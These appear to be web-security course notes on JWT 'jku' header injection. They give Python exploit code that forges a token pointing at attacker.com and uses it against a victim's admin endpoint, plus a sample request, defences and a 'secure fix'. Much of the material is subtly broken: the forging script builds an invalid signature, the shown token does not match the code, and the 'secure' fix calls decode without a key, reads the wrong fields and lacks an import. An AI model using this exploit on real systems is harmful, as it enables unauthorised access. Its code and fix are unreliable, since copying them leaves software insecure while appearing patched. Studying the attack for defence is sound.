---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Attack via `jku` Header Injection

One specific vulnerability in JWTs involves the `jku` (JWK Set URL) header. The `jku` header allows the server to fetch the public key from a specified URL, which can be manipulated by an attacker.

### Background Theory

When a JWT is received, the server needs to verify its signature. Typically, this is done using a public key. The `jku` header provides a URL from which the server can fetch the public key. If an attacker can control this URL, they can inject a malicious public key, allowing them to sign tokens with their own private key.

### Real-World Example

Consider a scenario where an attacker discovers that a web application uses JWTs with the `jku` header. The attacker crafts a malicious JWT with a `jku` header pointing to a URL controlled by the attacker. The attacker then signs the token with their own private key and sends it to the server. If the server fetches the public key from the attacker-controlled URL, it will accept the token as valid.

### Recent Breach Example

A real-world example of this vulnerability occurred in a breach where an attacker exploited a misconfigured JWT implementation. The attacker injected a `jku` header pointing to a malicious URL, allowing them to sign tokens with their own key and gain unauthorized access to the system.

### Step-by-Step Exploit

Let's walk through the steps of exploiting this vulnerability:

1. **Craft the Malicious JWT**:
    - Create a JWT with a `jku` header pointing to a URL controlled by the attacker.
    - Sign the token with the attacker's private key.

2. **Inject the Malicious JWT**:
    - Send the crafted JWT to the server.

3. **Server Fetches Public Key**:
    - The server fetches the public key from the URL specified in the `jku` header.
    - The server verifies the signature using the fetched public key.

4. **Access Granted**:
    - If the signature is valid, the server grants access based on the claims in the JWT.

### Complete Code Example

Here is a complete example of crafting and injecting a malicious JWT:

#### Crafting the Malicious JWT

First, we create the JWT with the `jku` header:

```python
import jwt
import base64
import json

# Define the header
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "http://attacker.com/public_key"
}

# Define the payload
payload = {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516239021,
    "exp": 1516240021
}

# Encode the header and payload
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')

# Concatenate the header and payload
token = f"{encoded_header.decode()}.{encoded_payload.decode()}"

# Sign the token with the attacker's private key
private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA...
-----END RSA PRIVATE KEY-----"""

signature = jwt.encode({"header": header, "payload": payload}, private_key, algorithm="RS256")

# Final malicious JWT
malicious_jwt = f"{token}.{signature}"
print(malicious_jwt)
```

#### Injecting the Malicious JWT

Next, we inject the crafted JWT into the server:

```python
import requests

url = "http://victim.com/admin"
headers = {
    "Authorization": f"Bearer {malicious_jwt}"
}

response = requests.get(url, headers=headers)
print(response.status_code)
print(response.text)
```

### Full HTTP Request and Response

Here is the full HTTP request and response:

#### HTTP Request

```http
GET /admin HTTP/1.1
Host: victim.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhZ2VyLmNvbS9wdWJsaWNfa2V5In0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYyNDEwMjF9.eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhZ2VyLmNvbS9wdWJsaWNfa2V5In0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYyNDEwMjF9
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Tue, 21 Mar 2023 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
<title>Admin Panel</title>
</head>
<body>
<h1>Welcome to the Admin Panel</h1>
<p>You have successfully accessed the admin panel.</p>
</body>
</html>
```

### How to Prevent / Defend

To prevent this attack, follow these best practices:

1. **Validate the `jku` Header**:
    - Ensure that the `jku` header points to a trusted URL.
    - Validate the URL against a whitelist of allowed domains.

2. **Use Strong Algorithms**:
    - Use strong cryptographic algorithms (e.g., RS256) to ensure the integrity of the token.

3. **Secure Key Management**:
    - Store private keys securely and limit access to them.
    - Rotate keys regularly to minimize the risk of compromise.

4. **Monitor and Detect**:
    - Implement monitoring and logging to detect unusual activity related to JWTs.
    - Use intrusion detection systems to identify potential attacks.

### Secure Code Fix

Here is an example of how to securely validate the `jku` header:

#### Vulnerable Code

```python
def validate_jwt(token):
    try:
        decoded_token = jwt.decode(token, options={"verify_signature": False})
        return True
    except jwt.exceptions.DecodeError:
        return False
```

#### Secure Code

```python
def validate_jwt(token):
    try:
        decoded_token = jwt.decode(token, options={"verify_signature": True})
        if "jku" in decoded_token["header"]:
            jku_url = decoded_token["header"]["jku"]
            if not is_trusted_url(jku_url):
                raise ValueError("Untrusted jku URL")
        return True
    except (jwt.exceptions.DecodeError, ValueError):
        return False

def is_trusted_url(url):
    trusted_domains = ["example.com", "trusteddomain.com"]
    parsed_url = urlparse(url)
    return parsed_url.netloc in trusted_domains
```

### Mermaid Diagrams

#### JWT Structure Diagram

```mermaid
graph LR
    JWT -->|Base64Url| Header
    JWT -->|Base64Url| Payload
    JWT -->|Base64Url| Signature
    Header -->|{"alg":"HS256","typ":"JWT"}|
    Payload -->|{"sub":"1234567890","name":"John Doe","iat":1516239021,"exp":1516240021}|
    Signature -->|Signed with Secret Key|
```

#### Attack Chain Diagram

```mermaid
sequenceDiagram
    participant Attacker
    participant Server
    participant Database
    Attacker->>Server: Craft JWT with jku header
    Server->>Database: Fetch public key from jku URL
    Server->>Attacker: Verify signature with fetched public key
    Server->>Attacker: Grant access to admin panel
```

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including JWT vulnerabilities.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing different types of attacks, including JWT manipulation.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for testing and learning about web vulnerabilities.

By thoroughly understanding and implementing these defensive measures, you can significantly reduce the risk of JWT-related attacks in your web applications.

---
<!-- nav -->
[[08-JWT Attack Vectors|JWT Attack Vectors]] | [[Web Security (PortSwigger)/19-JWT Attacks/05-Lab 5 JWT authentication bypass via jku header injection/00-Overview|Overview]] | [[10-JWT Key Management|JWT Key Management]]
